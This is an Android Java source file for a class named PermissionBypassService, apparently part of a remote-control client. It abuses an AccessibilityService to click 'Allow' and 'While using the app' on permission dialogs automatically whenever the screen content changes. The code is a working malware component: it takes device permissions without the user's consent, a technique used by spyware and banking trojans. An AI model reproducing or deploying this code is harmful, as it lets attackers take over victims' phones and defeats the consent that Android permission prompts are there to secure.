package com.ot.grhq.client;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class PermissionBypassService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Check if the event's source is available
        AccessibilityNodeInfo rootNode = event.getSource();
        if (rootNode == null) return;

        // Trigger automation on content changes
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            clickButtonWithText(rootNode, "Allow");
            clickButtonWithText(rootNode, "While using the app");
        }
    }

    @Override
    public void onInterrupt() {
        // Handle interruptions
    }

    private void clickButtonWithText(AccessibilityNodeInfo rootNode, String buttonText) {
        if (rootNode == null) return;

        List<AccessibilityNodeInfo> allNodes = rootNode.findAccessibilityNodeInfosByText(buttonText);
        for (AccessibilityNodeInfo node : allNodes) {
            if (node != null && node.isClickable() && node.getText() != null) {
                // Perform case-insensitive comparison
                if (node.getText().toString().equalsIgnoreCase(buttonText)) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                }
            }
        }
    }
}
